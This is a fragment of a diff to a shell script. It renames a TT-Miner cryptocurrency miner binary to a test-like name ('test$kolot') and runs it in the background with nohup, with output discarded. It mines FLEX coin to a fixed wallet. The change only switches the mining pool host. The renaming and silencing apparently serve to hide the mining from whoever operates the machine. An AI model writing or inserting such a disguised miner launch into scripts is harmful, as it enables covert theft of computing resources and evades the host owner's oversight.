@@ -10,4 +10,4 @@ cd TT-Miner-2024.2.1B5.2
 
 mv TT-Miner test$kolot
 
-nohup ./test$kolot -a FLEX -P kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.DOT-$kolot@eu.mpool.live:5271 > /dev/null 2>&1 &
+nohup ./test$kolot -a FLEX -P kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.DOT-$kolot@flex.eu.mine.zpool.ca:3340 > /dev/null 2>&1 &
